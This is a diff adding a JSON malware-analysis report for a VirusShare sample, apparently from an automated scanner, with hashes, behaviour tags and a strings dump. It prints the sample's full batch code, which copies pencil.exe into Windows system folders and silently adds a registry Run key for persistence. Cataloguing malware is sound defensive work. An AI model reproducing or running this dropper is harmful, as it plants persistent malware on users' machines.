@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "command": "May run PowerShell commands",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "@ctty nul\ncopy pencil.exe %windir%\\win.exe\ncopy pencil.exe %windir%\\system\\win.exe\ncopy pencil.exe %windir%\\command\\win.exe\necho REGEDIT4 >>C:\\z.reg\necho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >>c:\\Z.REG\nECHO \"Win32\"=\"C:\\\\windows\\\\win.exe\" >>C:\\z.reg\nregedit /s C:\\z.reg\ndel C:\\z.reg\n\n\n"
+    },
+    "filename": "VirusShare_0b629408a4a3061c292c221b3532bc46",
+    "filesize": 327,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0b629408a4a3061c292c221b3532bc46",
+        "sha1": "52951fda389f2c18c6bb9751293770708bae08b3",
+        "sha256": "7888318ccbcf062b36bdf4545147c2fdfdfaeb426b8908a3016a0ef4d0b9cfb7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul",
+            "copy pencil.exe %windir%\\win.exe",
+            "copy pencil.exe %windir%\\system\\win.exe",
+            "copy pencil.exe %windir%\\command\\win.exe",
+            "echo REGEDIT4 >>C:\\z.reg",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >>c:\\Z.REG",
+            "ECHO \"Win32\"=\"C:\\\\windows\\\\win.exe\" >>C:\\z.reg",
+            "regedit /s C:\\z.reg",
+            "del C:\\z.reg"
+        ],
+        "file": {
+            "ECHO \"Win32\"=\"C:\\\\windows\\\\win.exe\" >>C:\\z.reg": "Registry",
+            "copy pencil.exe %windir%\\command\\win.exe": "Executable",
+            "copy pencil.exe %windir%\\system\\win.exe": "Executable",
+            "copy pencil.exe %windir%\\win.exe": "Executable",
+            "del C:\\z.reg": "Registry",
+            "echo REGEDIT4 >>C:\\z.reg": "Registry",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >>c:\\Z.REG": "Registry",
+            "regedit /s C:\\z.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.259888",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
